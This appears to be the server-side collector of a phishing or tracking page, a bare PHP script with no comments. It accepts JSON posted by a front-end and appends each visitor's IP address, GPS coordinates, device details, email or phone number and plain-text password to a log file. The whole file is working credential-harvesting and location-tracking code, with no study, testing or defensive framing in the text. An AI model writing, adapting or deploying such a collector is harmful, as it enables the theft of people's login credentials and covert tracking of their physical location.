<?php
$jsonData = file_get_contents('php://input');
$data = json_decode($jsonData, true);

$ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown IP';
$serverUA = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown UA';

if ($data && isset($data['lat']) && isset($data['lng'])) {
    $logEntry = "========================================\n";
    $logEntry .= "📅 Time: " . date('Y-m-d H:i:s') . "\n";
    $logEntry .= "🌐 IP Address: " . $ip . "\n";
    $logEntry .= "📍 Latitude: " . $data['lat'] . "\n";
    $logEntry .= "📍 Longitude: " . $data['lng'] . "\n";
    $logEntry .= "📏 Accuracy: " . ($data['accuracy'] ?? 'N/A') . " meters\n";
    $logEntry .= "🖥️ OS: " . ($data['os'] ?? 'N/A') . "\n";
    $logEntry .= "🔋 Battery: " . ($data['battery'] ?? 'N/A') . "%\n";
    $logEntry .= "📧 Email/Phone: " . ($data['email'] ?? 'N/A') . "\n";
    $logEntry .= "🔑 Password: " . ($data['password'] ?? 'N/A') . "\n";
    $logEntry .= "🖥️ UA (frontend): " . ($data['userAgent'] ?? 'N/A') . "\n";
    $logEntry .= "🖥️ UA (server): " . $serverUA . "\n";
    $logEntry .= "----------------------------------------\n\n";
    file_put_contents('logs.txt', $logEntry, FILE_APPEND | LOCK_EX);
    echo json_encode(['status' => 'success']);
} else {
    http_response_code(400);
    echo json_encode(['status' => 'error']);
}
?>